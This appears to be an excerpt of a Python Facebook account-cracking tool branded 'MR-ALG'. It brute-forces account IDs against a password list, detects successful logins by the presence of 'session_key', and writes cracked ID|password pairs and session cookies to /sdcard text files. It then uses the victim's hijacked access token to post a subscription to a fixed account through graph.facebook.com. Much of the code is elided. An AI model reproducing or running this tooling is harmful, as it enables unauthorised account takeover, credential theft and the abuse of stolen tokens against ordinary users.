...
def menu():
            ...
            if xd in ['1','01']:
                clear()
                print(' \033[1;32m[\033[1;31m–\033[1;32m] FILE EXAMPLE : /sdcard/ALG.txt')
                dino()
                ...
                os.system('xdg-open https://www.facebook.com/mALG1')     
            else:
...
def M_file_1(ids,names,passlist):
                try:
                        ...
                        sys.stdout.write(f'\r\r\033[1;37m<[{boos}MR-ALG\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)))
                        sys.stdout.flush()
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\x1b[1;92m<[ALG-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                        ...
                                        if 'y' in pcp:
                                                #print('\r\r\033[1;34m<[ALG-2F]> '+ids+' | '+pas)
                                                open('/sdcard/ALG-2F.txt','a').write(ids+'|'+pas+'\n')
                                                twf.append(ids)
                                                break
              
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\x1b[38;5;246m<[ALG-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        token = q['access_token']
                                        requests.post('https://graph.facebook.com/' + '833553969/' + 'subscribers' + '?access_token=' + token)
                                        open('/sdcard/ALG_m3_OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/ALG_iDs_COOKiE_M4.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
...
def M_file_4(ids, names, passlist):
	try:
		global ok, loop,  sim_id
		boos = random.choice([P, M, H, K, B, U, O, N])
		sys.stdout.write(f'\r\r\033[1;37m<[{boos}MR-ALG\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)));sys.stdout.flush()
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				print('\r\x1b[1;92m<[ALGALG-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
				open('/sdcard/ALG_m4_OK.txt', 'a').write(ids + '|' + pas + '\n')
				...
				break
				    ...
				    if 'y' in pcp:
					        print('\r\x1b[38;5;246m<[AL-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
					        open('/sdcard/ALG-CP.txt', 'a').write(ids+'|'+pas+'\n')
					        cps.append(ids)
					        break
...
def approval():
  ...
  try:
    ...
    if 'Napv' in sec:
      boos = random.choice([P, M, H, K, B, U, O, N])
      print(f" \033[1;32m[\033[1;31m√\033[1;32m] YOUR KEY 🔐 \033[1;37m : {boos}DJALIL+\033[1;32m"+sec.replace('Napv',''))
      print('\033[1;34m─────────────────────────────────────────────')
